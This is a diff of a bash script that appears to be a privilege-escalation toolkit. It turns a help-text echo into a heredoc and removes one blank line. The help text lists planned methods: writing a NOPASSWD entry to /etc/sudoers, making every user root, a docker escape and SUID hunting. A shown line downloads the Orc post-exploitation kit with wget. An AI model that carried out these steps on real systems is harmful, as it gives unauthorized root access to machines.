@@ -164,7 +164,26 @@ cron(){
 
 escalate(){
 	conmethods(){
-		echo -e "\n\tThis function attempts to:\n\nwrite \"$USER ALL=(ALL) NOPASSWD: ALL\" to /etc/sudoers\n*make every user root\n*read doas config\n*exploit docker bash container exploit*\n*To find suid\n*get last edited files\n*list all capabilities\n"
+		cat <<-EOF
+
+
+			This function attempts to:
+
+			*write "$USER ALL=(ALL) NOPASSWD: ALL" to /etc/sudoers
+
+			*make every user root
+
+			*read doas config
+
+			*exploit docker bash container exploit*
+
+			*Attempt to find suid
+
+			*get last edited files
+
+			*list all capabilities
+
+		EOF
 		enter
 
 		declare -a methods=(
@@ -239,7 +258,6 @@ escalate(){
 
 
 	Orc(){
-	
 		wget -P $HOME https://github.com/zMarch/Orc/archive/master.zip 2>/dev/null
 		unzip -q $HOME/master.zip -d $HOME/Orc
 		cat <<-EOF
